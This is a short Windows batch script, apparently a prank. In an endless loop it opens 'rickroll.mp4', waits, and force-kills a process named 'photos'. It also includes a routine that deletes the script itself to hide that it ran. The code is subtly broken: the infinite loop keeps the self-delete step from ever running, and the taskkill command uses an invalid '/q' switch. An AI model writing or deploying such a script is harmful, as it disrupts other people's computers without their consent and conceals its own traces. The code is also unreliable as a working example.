timeout /t 3 /nobreak
:loop
start "" rickroll.mp4
timeout /t 5 /nobreak
taskkill /f /q photos
goto :loop
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
